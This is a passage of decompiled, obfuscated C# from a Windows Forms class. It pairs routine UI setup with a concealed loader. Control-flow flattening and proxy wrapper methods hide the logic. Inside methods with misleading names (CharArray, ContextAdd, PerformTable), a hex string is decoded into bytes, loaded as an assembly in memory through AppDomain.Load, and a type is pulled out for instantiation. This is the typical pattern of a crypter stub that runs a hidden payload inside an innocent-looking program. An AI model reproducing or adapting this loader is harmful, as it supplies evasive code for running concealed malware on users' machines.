					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -630918218) ^ -1175123306;
					continue;
				case 16u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -2108246001) ^ -652309286;
					continue;
				case 15u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1369368346) ^ 0x509354D2;
					continue;
				case 14u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -1162912527) ^ 0x697770D4;
					continue;
				case 13u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -126081533) ^ 0x547F6934;
					continue;
				case 12u:
					button2 = Form1.smethod_53();
					num = (int)(num2 * 791651256) ^ -1162474079;
					continue;
				case 11u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)((num2 * 719391825) ^ 0x4A828A3C);
					continue;
				case 10u:
					num = ((int)num2 * -913501962) ^ 0x7ED337DA;
					continue;
				case 9u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)(num2 * 2027035653) ^ -1848073681;
					continue;
				case 8u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -2130534188) ^ 0x2C2EA793;
					continue;
				case 7u:
					num = ((int)num2 * -1245187084) ^ -1391855675;
					continue;
				case 6u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)(num2 * 1627974578) ^ -298348003;
					continue;
				case 5u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -1333262778) ^ 0x34FC6613;
					continue;
				case 4u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)(num2 * 442079594) ^ -813825831;
					continue;
				case 3u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 404619584) ^ -1216893993;
					continue;
				case 2u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)((num2 * 593531270) ^ 0x44D06B6);
					continue;
				case 1u:
					num = ((int)num2 * -1101584952) ^ -687231980;
					continue;
				case 0u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -1129480408) ^ -205891472;
					continue;
				default:
					return;
				case 121u:
					break;
				case 46u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = 641421069;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x536572A1u) % 5u)
				{
				case 4u:
					q = ContextAdd(Level);
					num = ((int)num2 * -1952247014) ^ -1009514140;
					continue;
				case 2u:
					PerformTable(q);
					num = ((int)num2 * -1045545090) ^ 0x741375CC;
					continue;
				case 1u:
					num = (int)(num2 * 1018928343) ^ -764622117;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		return Form1.smethod_94(Form1.smethod_93(), Position);
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
